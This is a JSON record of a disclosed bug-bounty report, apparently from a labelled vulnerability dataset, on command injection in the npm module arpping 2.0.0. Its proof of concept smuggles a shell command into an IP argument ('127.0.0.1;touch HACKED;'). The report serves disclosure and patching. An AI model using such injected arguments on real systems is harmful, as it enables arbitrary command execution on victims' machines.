{
  "reported_to": "Node.js third-party modules",
  "reported_by": "solov9ev ",
  "title": "[arpping] Remote Code Execution",
  "content": "\nI would like to report RCE in arpping\nIt allows to execute arbitrary commands on the victim's PC\nModule\nmodule name: arpping\nversion: 2.0.0\nnpm page: https://www.npmjs.com/package/arpping\nModule Description\nDiscover and search for internet-connected devices (locally) using ping and arp\nModule Stats\n[16] weekly downloads\nVulnerability\nVulnerability Description\nCode injection occurs when using commands: ping, arp\nSteps To Reproduce:\nCreate and run the following POC index.js:\nCode 154 Bytes\n1const Arpping = require('arpping');\n2\n3var arpping = new Arpping();\n4arpping.ping([\"127.0.0.1;touch HACKED;\"]); // arpping.arp([\"127.0.0.1; touch HACKED;\"]);\nThe exploit worked and created the file - HACKED\nPatch\nCheck input before command\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nCommand Injection on arpping module via insecure command\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1610631540,
  "report_url": "https://hackerone.com/reports/972220",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection in the 'arpping' module, which is not related to authentication or authorization boundaries within a web application. The proposed methodologies focus on detecting IDOR and AuthN/AuthZ bypasses by analyzing HTTP requests/responses and user sessions, which are not applicable to this RCE vulnerability in a Node.js module.",
    "is_detectable": false
  }
}